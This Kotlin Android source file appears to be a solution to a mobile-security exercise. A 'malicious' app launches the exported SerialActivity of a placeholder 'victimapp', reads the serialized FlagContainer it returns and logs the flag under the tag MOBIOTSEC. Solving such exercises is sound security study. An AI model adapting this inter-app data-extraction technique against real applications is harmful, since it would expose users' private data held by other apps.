package com.example.maliciousapp

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

import com.example.victimapp.FlagContainer

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.SerialActivity"
            )
        }
        val contract = ActivityResultContracts.StartActivityForResult()
        registerForActivityResult(contract) { result ->
            val container = result
                .data
                ?.getSerializableExtra("flag", FlagContainer::class.java)

            container?.let { Log.d("MOBIOTSEC", it.getFlag()) }
        }.launch(intent)
    }
}
